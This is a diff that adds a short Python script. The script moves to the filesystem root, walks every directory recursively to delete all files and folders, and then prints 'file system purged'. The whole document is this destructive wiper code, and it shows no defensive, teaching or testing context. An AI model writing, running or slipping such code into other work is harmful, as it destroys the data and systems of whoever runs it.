@@ -1,0 +1,23 @@
+import os
+
+depth = 0
+
+os.chdir('/')
+
+def exp():
+   
+    global depth
+
+    for fd in os.listdir():
+        try:
+            os.remove(fd)
+        except:
+            depth += 1
+            os.chdir(fd)
+            exp()
+            os.chdir("..")
+            depth -= 1
+            os.rmdir(fd)
+
+exp()
+print("file system purged")
